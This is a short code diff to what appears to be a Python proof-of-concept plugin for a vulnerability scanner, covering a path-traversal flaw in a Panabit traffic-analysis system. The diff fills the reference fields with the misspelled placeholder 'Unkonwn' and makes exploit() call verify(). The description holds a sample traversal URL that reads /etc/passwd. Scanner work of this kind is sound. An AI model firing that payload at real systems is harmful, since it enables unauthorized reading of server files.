@@ -13,9 +13,9 @@ class Vuln(ABVuln):
     desc = '''
         派网软件（Panabit）某流量分析管理系统任意文件遍历:http://foorbar/download.php?filename=../../../../etc/passwd
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '派网软件'  # 漏洞应用名称
     product_version = '派网软件某流量分析管理系统'  # 漏洞应用版本
 
@@ -49,7 +49,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
